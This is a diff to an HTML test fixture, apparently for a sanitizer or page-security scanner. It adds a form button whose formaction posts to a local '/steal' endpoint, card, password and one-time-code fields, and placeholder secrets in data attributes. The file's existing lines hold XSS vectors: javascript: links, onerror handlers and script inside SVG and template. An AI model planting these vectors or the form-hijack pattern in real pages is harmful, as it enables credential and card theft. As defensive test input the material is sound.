@@ -40,13 +40,20 @@
     <textarea id="ta"></textarea>
     <input id="submit" type="submit">
     <button id="btn" type="button" onclick="alert(1)">ƒ{ƒ^ƒ“</button>
+    <button id="fa" type="submit" formaction="http://127.0.0.1:4101/steal">formaction</button>
+    <input id="pw-shown" type="password" name="password" autocomplete="current-password">
+    <input id="cc" type="text" name="cardnumber" autocomplete="cc-number">
+    <input id="cvc" type="text" name="cvc" autocomplete="cc-csc">
+    <input id="otp" type="text" name="code" autocomplete="one-time-code">
+    <input id="cardnote" type="text" name="card_note">
   </form>
+  <div id="props" data-csrf-token="SECRET-DATA-789" data-api-key="SECRET-KEY-000" data-props='{"user":"kim","csrf_token":"SECRET-JSON-111","jwt":"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SECRETJWTSIGNATURE123","title":"hello"}'></div>
   <a id="js1" href="javascript:alert(1)">js link</a>
   <a id="js2" href=" &#10;JaVaScRiPt:alert(2)">js link 2</a>
   <a id="ok" href="sub/quirks.html">normal link</a>
   <img id="img-onerror" src="nope.png" onerror="window.__x=1" alt="">
   <svg id="svg" width="40" height="20"><script>alert(3)</script><a href="javascript:alert(4)"><text x="0" y="15">svg</text></a><set attributeName="href" to="javascript:alert(5)"/></svg>
-  <template id="tpl"><img src="x" onerror="alert(6)"><script>alert(7)</script><iframe src="https://example.com"></iframe></template>
+  <template id="tpl"><img src="x" onerror="alert(6)"><script>alert(7)</script><iframe src="https://example.com"></iframe><input name="api_token" value="SECRET-TPL-222"></template>
 </div>
 </body>
 </html>
